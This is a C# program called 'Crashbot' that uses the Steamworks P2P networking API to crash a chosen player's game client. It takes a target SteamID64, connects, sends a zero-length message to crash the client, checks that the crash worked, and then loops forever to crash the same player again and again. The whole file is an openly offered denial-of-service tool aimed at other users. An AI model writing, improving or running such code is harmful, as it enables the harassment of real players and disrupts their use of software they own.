using Steamworks;
using System.Reflection;

namespace Crashbot
{
    internal class Program
    {
        private static readonly SteamNetworkingConfigValue_t[] LongTimeoutOptions = [
            new SteamNetworkingConfigValue_t
            {
                m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
                m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutConnected,
                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = 500 }
            },
            new SteamNetworkingConfigValue_t
            {
                m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
                m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutInitial,
                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = Int32.MaxValue }
            }
        ];

        private static readonly SteamNetworkingConfigValue_t[] ConnectionTimeoutOptions = [
            new SteamNetworkingConfigValue_t
            {
                m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
                m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutInitial,
                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = 800 }
            }
        ];

        /*
        private static readonly SteamNetworkingConfigValue_t[] PersistantTimeoutOptions = [
            new SteamNetworkingConfigValue_t
            {
                m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
                m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutInitial,
                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = Int32.MaxValue }
            }
        ];
        */

        static void Main(string[] args)
        {
            Environment.CurrentDirectory = Directory.GetParent(Assembly.GetExecutingAssembly()?.Location ?? AppContext.BaseDirectory)!.FullName;
            File.WriteAllText("steam_appid.txt", "387990");

            if (!Steamworks.SteamAPI.Init())
            {
                Console.Clear();
                Console.WriteLine($"[{DateTime.Now}] SteamAPI.Init() failed!");
                return;
            }
            else
            {
                Console.Clear();
                Console.WriteLine($"[{DateTime.Now}] UserName: '" + Steamworks.SteamFriends.GetPersonaName()+"'");
                Console.WriteLine($"[{DateTime.Now}] SteamId: " + Steamworks.SteamUser.GetSteamID().m_SteamID);
                Console.WriteLine($"[{DateTime.Now}] BLoggedOn: [" + Steamworks.SteamUser.BLoggedOn()+"]");
            }

            while (true)
            {
                // Gather target
                Console.WriteLine(Environment.NewLine);
                Console.Write($"[{DateTime.Now}] Enter target SteamID64: ");

                string steamid = Program.ReadSteamId();
                if (string.IsNullOrEmpty(steamid))
                    continue;
                ulong target = ulong.Parse(steamid);

                // Initiate the connection
                Console.WriteLine($"[{DateTime.Now}] Targeting '{Steamworks.SteamFriends.GetFriendPersonaName(new CSteamID(target))}'");

                var t = new CSteamID(target);
                int count = Steamworks.SteamFriends.GetFriendRichPresenceKeyCount(t);
                for (int i = 0; i < count; i++)
                {
                    string key = Steamworks.SteamFriends.GetFriendRichPresenceKeyByIndex(t, i);
                    string value = Steamworks.SteamFriends.GetFriendRichPresence(t, key);
                    Console.WriteLine($"[{DateTime.Now}] RichPresence: {key} = {value}");
                }

                Console.WriteLine($"[{DateTime.Now}] Connecting...");
                var (conn, info) = ConnectAndWait(target, LongTimeoutOptions);

                if (info.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected)
                {
                    Console.WriteLine($"[{DateTime.Now}] Connected!");
                }
                else
                {
                    Console.WriteLine($"[{DateTime.Now}] Failed to connect. Possibly Friends Only or Private");
                    continue;
                }

                // Crash the client
                Program.ReadOneAndSendOne(conn, 0, 0, 0);
                Console.WriteLine($"[{DateTime.Now}] Crashing client...");
                Thread.Sleep(500);
                Steamworks.SteamNetworkingSockets.CloseConnection(conn, 0, string.Empty, false);

                // Check if the client crashed
                Console.WriteLine($"[{DateTime.Now}] Checking target...");
                var (_, info2) = ConnectAndWait(target, ConnectionTimeoutOptions);

                bool crashed = info2.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally;
                Console.WriteLine($"[{DateTime.Now}] {(crashed ? "Successfully Crashed!" : "Failed to Crash. Possibly Friends Only or Private")}");

                // Forever Crash
                int count = 1;
                while (crashed)
                {
                    var (conn_x, _) = ConnectAndWait(target, LongTimeoutOptions);
                    Program.ReadOneAndSendOne(conn_x, 0, 0, 0);
                    Thread.Sleep(500);
                    Steamworks.SteamNetworkingSockets.CloseConnection(conn_x, 0, string.Empty, false);
                    Console.WriteLine($"[{DateTime.Now}] Crashed client {++count}x");
                }
            }
        }

        private static string ReadSteamId()
        {
            string steamid = Console.ReadLine()?.Trim() ?? string.Empty;
            
            if (string.IsNullOrEmpty(steamid))
                Console.WriteLine($"[{DateTime.Now}] Invalid SteamID64");

            if (steamid.Contains("http", StringComparison.InvariantCultureIgnoreCase))
                steamid = steamid.Split('/').Last();
            
            return steamid;
        }

        private static (HSteamNetConnection Connection, SteamNetConnectionInfo_t Info) ConnectAndWait(ulong target, SteamNetworkingConfigValue_t[] options)
        {
            var steamuser = new SteamKit2.SteamID(target);
            CSteamID cSteamID = new(steamuser.ConvertToUInt64());

            SteamNetworkingIdentity remoteIdentity = new();
            remoteIdentity.SetSteamID(cSteamID);
            HSteamNetConnection conn = SteamNetworkingSockets.ConnectP2P(ref remoteIdentity, 0, options.Length, options);

            Thread.Sleep(10);
            Steamworks.SteamAPI.RunCallbacks();
            Steamworks.SteamNetworkingSockets.RunCallbacks();
            Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn, out Steamworks.SteamNetConnectionInfo_t info);

            while (info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected
                && info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally
                && info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ClosedByPeer)
            {
                Steamworks.SteamAPI.RunCallbacks();
                Steamworks.SteamNetworkingSockets.RunCallbacks();
                Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn, out info);

                Thread.Sleep(10);
            }

            return (conn, info);
        }

        private static void ReadOneAndSendOne(HSteamNetConnection connection, IntPtr data, uint dataLen, int flags)
        {
            int maxMessages = 1;
            while (true)
            {
                IntPtr[] messagePointers = new IntPtr[maxMessages];
                int messageCount = Steamworks.SteamNetworkingSockets.ReceiveMessagesOnConnection(connection, messagePointers, maxMessages);

                if (messageCount > 0)
                {
                    Steamworks.SteamNetworkingSockets.SendMessageToConnection(connection, data, dataLen, flags, out long _);
                    Steamworks.SteamNetworkingSockets.FlushMessagesOnConnection(connection);

                    Steamworks.SteamAPI.RunCallbacks();
                    Steamworks.SteamNetworkingSockets.RunCallbacks();
                    break;
                }
                else
                {
                    Thread.Sleep(10);
                }
            }
        }
    }
}
